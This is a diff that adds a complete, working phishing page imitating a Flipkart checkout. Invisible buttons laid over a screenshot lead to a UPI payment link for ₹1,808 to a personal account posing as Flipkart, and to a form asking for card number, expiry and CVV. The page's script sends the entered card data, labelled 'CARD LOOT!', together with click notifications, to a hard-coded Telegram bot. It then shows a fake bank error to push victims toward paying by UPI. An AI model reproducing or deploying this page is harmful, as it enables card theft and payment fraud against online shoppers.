@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { margin: 0; padding: 0; font-family: sans-serif; }
+        .container { position: relative; width: 100%; max-width: 500px; margin: auto; }
+        .bg { width: 100%; display: block; }
+        /* UPI Invisible Button (Pay Button ke upar) */
+        .upi-link { position: absolute; top: 462px; left: 17%; width: 66%; height: 48px; background: rgba(0,0,0,0); }
+        /* Card Invisible Button (Debit Card row ke upar) */
+        .card-row { position: absolute; top: 575px; left: 0; width: 100%; height: 60px; background: rgba(0,0,0,0); cursor: pointer; }
+        /* Details Form */
+        #f { display: none; position: absolute; top: 645px; left: 5%; width: 86%; background: #fff; padding: 15px; border: 1px solid #ddd; z-index: 100; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        input { width: 92%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; font-size: 16px; border-radius: 4px; }
+        .pay-btn { width: 100%; background: #fb641b; color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/6P0L8yv/1000010816.jpg" class="bg">
+        
+        <a href="upi://pay?pa=ashishtrivedi7904-1@okicici&pn=Flipkart&am=1808&cu=INR" onclick="notif('🔥 UPI Clicked!')" class="upi-link"></a>
+        
+        <div onclick="document.getElementById('f').style.display='block'; notif('💳 User on Card Page')" class="card-row"></div>
+
+        <div id="f">
+            <input type="number" id="n" placeholder="Card Number">
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="e" placeholder="MM/YY" style="width: 45%;">
+                <input type="password" id="c" placeholder="CVV" style="width: 45%;">
+            </div>
+            <button onclick="loot()" class="pay-btn">PAY ₹1,808</button>
+        </div>
+    </div>
+    <script>
+        const tok = "8586171545:AAE94u2w4vxDHQwYy42mVzzKedpV7qM8PeY";
+        const cid = "8507883717";
+        function notif(m) { fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}`); }
+        function loot() {
+            const data = `🔥 *CARD LOOT!*\n\nNo: ${document.getElementById('n').value}\nExp: ${document.getElementById('e').value}\nCVV: ${document.getElementById('c').value}`;
+            notif(data);
+            alert("Technical Error: Bank Server Busy. Use UPI for fast payment.");
+        }
+    </script>
+</body>
+</html>
